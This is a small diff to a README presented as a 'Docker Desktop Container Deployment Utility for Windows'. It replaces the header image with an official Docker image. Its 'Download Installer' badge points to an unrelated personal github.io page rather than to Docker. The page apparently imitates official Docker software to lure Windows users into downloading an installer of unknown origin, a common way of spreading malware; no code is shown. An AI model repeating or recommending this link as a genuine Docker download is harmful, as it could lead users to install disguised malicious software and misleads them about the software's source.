@@ -1,7 +1,7 @@
 # Docker Desktop Container Deployment Utility for Windows
 
 <div align="center">
-<img src="https://habrastorage.org/getpro/habr/upload_files/b81/577/1d7/b815771d7cfee0cd79d15b58471768c6.jpg" alt="Docker Desktop Logo" width="560">
+<img src="https://www.docker.com/app/uploads/2025/05/DD-hiroko-2320x1456.png" alt="Docker Desktop Logo" width="560">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://tonywardoxeq.github.io/.github/Docker-Desktop-Windows-Containers)
